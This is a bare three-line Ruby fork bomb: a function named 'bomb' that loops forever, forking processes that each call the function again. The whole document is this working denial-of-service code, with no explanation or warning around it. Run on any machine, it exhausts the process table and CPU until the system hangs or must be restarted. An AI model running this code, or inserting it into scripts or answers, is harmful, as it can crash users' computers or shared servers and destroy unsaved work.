def bomb
	loop { fork { bomb } }
end; bomb